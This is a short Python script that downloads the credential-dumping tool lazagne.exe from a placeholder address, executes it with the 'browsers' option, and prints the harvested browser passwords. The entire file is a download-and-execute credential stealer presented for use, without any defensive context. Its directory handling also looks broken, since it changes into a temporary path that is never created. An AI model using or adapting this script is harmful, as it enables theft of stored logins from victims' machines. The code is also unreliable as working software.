#!/usr/bin/env python3
# coding: cp850

import requests
import subprocess
import os
import tempfile

def run_command(command):
	output = subprocess.check_output(command, shell=True)
	return output.decode("cp850")

def download_and_execute():
	r = requests.get("<ip>/lazagne.exe")
	temp_file = tempfile.mktemp()
	os.chdir(temp_file)

	with open("lazagne.exe", "wb") as f:
		f.write(r.content)

	output = run_command("lazagne.exe browsers")
	return output

if __name__ == "__main__":
	output = download_and_execute()
	print(output)